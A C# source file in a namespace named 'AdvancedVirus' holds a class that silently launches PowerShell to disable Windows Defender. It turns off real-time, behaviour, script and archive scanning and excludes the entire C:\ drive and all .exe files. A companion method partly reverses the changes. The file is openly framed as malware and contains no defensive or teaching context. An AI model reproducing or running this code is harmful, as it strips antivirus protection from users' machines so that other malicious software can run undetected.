using System;
using System.Diagnostics;

namespace AdvancedVirus
{
    public class WindowsDefenderPowerShellDisabler
    {
        public void DisableWindowsDefender()
        {
            string psScript = @"
            try {
                Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
                Set-MpPreference -DisableBehaviorMonitoring $true
                Set-MpPreference -DisableBlockAtFirstSeen $true
                Set-MpPreference -DisableIOAVProtection $true
                Set-MpPreference -DisablePrivacyMode $true
                Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
                Set-MpPreference -DisableArchiveScanning $true
                Set-MpPreference -DisableIntrusionPreventionSystem $true
                Set-MpPreference -DisableScriptScanning $true
                Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue
                Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue
                Write-Host 'Windows Defender disabled successfully.'
            } catch {
                Write-Host 'Failed to disable Windows Defender: ' $_.Exception.Message
            }
        ";

            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command \"{psScript}\"",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    if (!string.IsNullOrEmpty(output))
                        Console.WriteLine(output);
                    if (!string.IsNullOrEmpty(error))
                        Console.WriteLine("PowerShell Error: " + error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to start PowerShell: {ex.Message}");
            }
        }

        public void EnableWindowsDefender()
        {
            string psScript = @"
            try {
                Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
                Set-MpPreference -DisableBehaviorMonitoring $false
                Remove-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue
                Remove-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue
                Write-Host 'Windows Defender re-enabled successfully.'
            } catch {
                Write-Host 'Failed to enable Windows Defender: ' $_.Exception.Message
            }
        ";

            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command \"{psScript}\"",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    if (!string.IsNullOrEmpty(output))
                        Console.WriteLine(output);
                    if (!string.IsNullOrEmpty(error))
                        Console.WriteLine("PowerShell Error: " + error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to start PowerShell: {ex.Message}");
            }
        }
    }
}